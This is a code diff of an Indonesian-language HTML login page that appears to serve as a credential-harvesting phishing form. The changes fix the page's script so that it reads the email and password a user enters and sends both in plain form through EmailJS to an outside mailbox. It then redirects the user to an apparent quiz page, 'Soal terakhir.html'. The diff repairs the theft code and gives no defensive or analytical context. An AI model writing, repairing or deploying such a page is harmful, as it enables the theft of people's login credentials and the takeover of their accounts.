@@ -104,7 +104,7 @@
     <form id="loginForm">
       <input type="email" id="email" placeholder="Masukkan Email" required>
       <input type="password" id="password" placeholder="Masukkan Password" required>
-      <a href="Soal terakhir.html"><button type="submit" id="loginForm">Masuk</button></a>
+      <button type="submit">Masuk</button>
     </form>
     <div class="policy">
       <a href="privacy.html">Privacy & Policy</a>
@@ -113,26 +113,31 @@
 
   <script>
     (function() {
-    emailjs.init("m3rAuaaaxgXO0rXri"); // Ganti dengan Public Key kamu
-  })();
+      emailjs.init("m3rAuaaaxgXO0rXri"); // Ganti dengan Public Key kamu
+    })();
 
-  document.getElementById("loginForm").addEventListener("submit", function(e) {
-    e.preventDefault();
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
 
-    const templateParams = {
-      user_email: email,
-      user_password: password
-    };
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
 
-    emailjs.send("service_y5ba2kk", "template_pini9ru", templateParams)
-      .then(() => {
-          window.location.href = "Soal terakhir.html";
-        }, 1500);
-      })
-      .catch(() => {
-        loading.innerText = "Gagal, tolong coba lagi";
-      });
-  });
+      const templateParams = {
+        user_email: email,
+        user_password: password
+      };
+
+      emailjs.send("service_y5ba2kk", "template_pini9ru", templateParams)
+        .then(() => {
+          // Setelah berhasil kirim, pindah ke halaman
+          setTimeout(() => {
+            window.location.href = "Soal terakhir.html";
+          }, 1500);
+        })
+        .catch(() => {
+          alert("Gagal, tolong coba lagi.");
+        });
+    });
   </script>
 </body>
 </html>
